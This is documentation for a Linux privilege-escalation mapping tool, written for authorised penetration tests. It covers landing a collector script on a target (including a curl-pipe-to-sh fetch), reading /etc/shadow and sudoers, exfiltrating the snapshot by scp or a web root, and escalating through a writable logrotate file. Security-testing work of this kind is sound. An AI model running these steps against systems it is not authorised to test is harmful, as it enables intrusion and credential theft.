# Penetration testing

This page documents the workflow for using privmap during an authorised
penetration test or red team engagement, where you typically have a
shell on the target as some user, may or may not have root, and cannot
install arbitrary Python packages on the host.

!!! warning "Authorization"
    Use privmap only on systems you own or have explicit written
    authorisation to test. The collector attempts to read sensitive files
    (`/etc/shadow`, `/etc/sudoers`, process command lines) and produces
    a complete inventory of the host's permission layout. Treat the
    output accordingly.

## The split-tool model

privmap follows the same pattern BloodHound uses for Active Directory:
the collector runs on the target, the analyzer runs on your operator
workstation.

- **`collect.sh`** is the collector. A single POSIX shell script,
  roughly 5 KB of text. No Python, no dependencies beyond standard
  userland utilities (`find`, `awk`, `getcap`, `getfacl`). It runs as
  whatever user you are and produces a tarball.
- **`privmap`** is the analyzer. A Python tool that runs on your
  workstation against the tarball. The target never sees it.

You do not install privmap on the target. You install the collector,
which is small enough to paste over a shell.

## Workflow overview

```text
  ┌──────────────┐     1. Land collect.sh      ┌──────────────┐
  │  operator    │ ──────────────────────────> │   target     │
  │  workstation │                             │   (foothold) │
  └──────────────┘                             └──────────────┘
         ^                                            │
         │                         2. Run collect.sh  │ 
         │                                            v
         │             3. Exfiltrate          ┌──────────────┐
         │ <──────────────────────────────────│  snapshot    │
         │                                    │   .tar.gz    │
         │                                    └──────────────┘
         │
         v
  4. privmap --snapshot snapshot.tar.gz --user <you>
         │
         v
  [escalation paths and remediation]
```

## Step 1: Get the collector onto the target

`collect.sh` is small enough that you can land it through any text
channel you already control on the target.

### Via existing transfer

The cleanest options when they work:

```bash
# scp from your workstation
scp collect.sh user@target:/tmp/

# wget from a hosted location
wget https://your-host/collect.sh -O /tmp/collect.sh

# curl pipe-to-sh if you really want to (skip the local file)
curl -sSL https://your-host/collect.sh | sh
```

### Via heredoc paste

If you only have a shell and no transfer channel, paste the script
directly:

```bash
cat > /tmp/collect.sh <<'COLLECT_EOF'
... paste the contents of collect.sh here ...
COLLECT_EOF
chmod +x /tmp/collect.sh
```

The single-quoted heredoc tag (`'COLLECT_EOF'`) prevents the shell from
interpreting `$` or backticks in the script contents.

### Via base64

If the channel mangles whitespace:

```bash
# On your workstation:
base64 -w0 collect.sh > collect.b64

# On the target (paste the base64 blob):
echo 'PASTE_BASE64_HERE' | base64 -d > /tmp/collect.sh
chmod +x /tmp/collect.sh
```

## Step 2: Run the collector

```bash
cd /tmp
./collect.sh
```

The script produces `privmap_snapshot_<hostname>_<YYYYMMDD>.tar.gz` in
the current directory.

### As an unprivileged user

This is the realistic pentest case. `collect.sh` runs fine without root
and gathers what is readable to your current uid. The tarball is smaller
and the analysis will be partial, but it is still the right starting
point.

What you still get unprivileged:

- `/etc/passwd`, `/etc/group` (world-readable)
- SUID and SGID binary enumeration
- World-writable files and directories in `/etc`, `/usr`, `/opt`,
  `/tmp`, `/var`
- POSIX ACLs on files you can read (`getfacl` works as any user)
- Linux capability binaries (`getcap` works as any user)
- Periodic cron dirs (`/etc/cron.{hourly,daily,weekly,monthly}` are
  usually world-readable)
- Most systemd unit files
- Your own process and group memberships

What you lose unprivileged:

- `/etc/shadow` (most systems). Only matters for empty-password
  detection.
- `/etc/sudoers` and `/etc/sudoers.d/*` on many systems (mode `0440
  root:root`). Significant; many escalation paths go through sudo. Run
  `sudo -l` manually to fill in your own rules.
- `/var/spool/cron/crontabs/*` (mode `0730 root:crontab` on Debian).
  Other users' crontabs.
- Other users' `/proc/*/status` and `/proc/*/cmdline`.

### As root

If you already have root, you may still want to run the collector to
*audit* the box: find any further escalation paths that exist between
users, or document the privilege topology for the report. Just `sudo
./collect.sh`.

### As an in-between account

Some accounts have access to specific privileged inputs (members of
the `adm` group can read most of `/var/log`; some service accounts have
selective `/etc/sudoers.d/*` entries). The collector picks up whatever
your current uid and gids can read, no more.

## Step 3: Exfiltrate the snapshot

The tarball is gzipped POSIX tar. Move it however you move files.
Common patterns:

```bash
# scp out
scp /tmp/privmap_snapshot_*.tar.gz operator@your-host:~/

# Stage to a writable location your operator can reach via the same
# channel you used to get in
mv /tmp/privmap_snapshot_*.tar.gz /var/www/html/   # if you popped a web app

# Base64 to clipboard for pure-shell exfil
base64 -w0 /tmp/privmap_snapshot_*.tar.gz | xclip   # local
```

Snapshots from a real Linux server are typically 100 KB to a few MB.

## Step 4: Analyze on your workstation

On your operator box, with privmap installed:

```bash
privmap --snapshot ./privmap_snapshot_target_20260507.tar.gz \
        --user $(YOUR_USERNAME_ON_TARGET) \
        --min-severity low
```

Replace `YOUR_USERNAME_ON_TARGET` with the account you have a shell as.
`--user` scopes the traversal to paths starting from that account, which
is the only set of paths actually relevant to your foothold.

To see paths for every user the collector enumerated (useful for a
hardening report, less useful mid-engagement):

```bash
privmap --snapshot snapshot.tar.gz
```

Useful output combinations:

```bash
# Markdown report for the engagement writeup
privmap --snapshot snapshot.tar.gz --user www-data --output markdown > findings.md

# JSON for ingestion into your reporting tooling
privmap --snapshot snapshot.tar.gz --user www-data --output json > findings.json

# Full graph export for visual investigation in Gephi/Neo4j
privmap --snapshot snapshot.tar.gz --export-graph graph.json
```

## Step 5: Walk the path

privmap reports paths as a sequence of hops with a one-line risk
explanation and a concrete remediation. The remediation also doubles as
an attacker's recipe. It tells you exactly which file to write, which
binary to invoke, or which sudo rule to abuse.

For example, given a chain like:

```text
Path 1: www-data -> root (4 hops)
  www-data
    MEMBER_OF  group: adm
    CAN_WRITE  file: /etc/logrotate.d/myapp  (mode: 0664)
    EXECUTES   cron: /etc/cron.daily/myapp-logs  (runs-as: root)
  -> root
```

The exploitation step is "edit `/etc/logrotate.d/myapp` to include a
`postrotate` block that runs your payload, then wait for the daily
cron." privmap is not delivering an exploit; it is delivering the
final missing connection between independent observations a flat-list
scanner would have shown you separately.

## Re-running after partial escalation

If your first run as `www-data` surfaces a path to a different
non-root account (say `postgres`), and you successfully take that
account:

```bash
# Re-run the collector as the new account
sudo -u postgres /tmp/collect.sh
```

The new tarball will have postgres's view of the system, which may
include different cron data, ACL access, or sudo rules. Analyze it
the same way:

```bash
privmap --snapshot postgres_snapshot.tar.gz --user postgres
```

Iterate until you reach root or run out of edges.

## Operator hygiene

- The snapshot tarball contains sensitive material. If the collector
  ran as root it has `/etc/shadow`. Even unprivileged it has enough
  trust topology to be damaging if it leaks. Treat it like the rest of
  your engagement loot: encrypt at rest, transmit over the same secure
  channel you use for everything else, delete from the target after
  exfiltration.

- `collect.sh` itself is innocuous on a server (it shells out to
  standard utilities and writes one tarball) but leaves an obvious
  artefact: a file called `privmap_snapshot_*.tar.gz` in the directory
  you ran it from. Delete it from the target after you exfil.

- The collector does not collect kernel keyring entries, TLS keys,
  SSH keys, application secrets, or anything outside privilege
  enumeration. It does not phone home and has no network code.

## See also

- [Snapshot mode](snapshot-mode.md) for the same collector workflow
  framed for IR and forensics.
- [Live analysis](live-analysis.md) for running privmap directly on a
  host you control.
- [Known limitations](../limitations.md) for where the analysis is
  best-effort and findings need manual verification.
